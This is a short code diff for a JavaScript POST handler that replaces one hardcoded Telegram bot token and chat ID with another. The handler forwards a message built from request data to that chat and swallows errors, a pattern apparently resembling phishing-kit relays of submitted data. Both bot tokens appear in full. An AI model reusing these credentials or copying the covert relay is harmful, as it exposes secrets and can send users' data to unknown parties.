@@ -14,7 +14,7 @@ const getCurrentTime = () => {
 
 const TelegramBot = require("node-telegram-bot-api");
 
-const bot = new TelegramBot("8123104385:AAHdjn1u2dCPLbaWmK2sfWcAbZUiVTBmB_U", {
+const bot = new TelegramBot("7751683087:AAHMciY_32CuKUuiuuqVnKS0stZK7B5xAoM", {
   polling: false,
 });
 
@@ -35,7 +35,7 @@ export async function POST(req, res) {
   ];
 
   try {
-    const chatId = "-4545059494";
+    const chatId = "-4662485733";
     await bot.sendMessage(chatId, message.join("\n"));
   } catch (error) {}
 
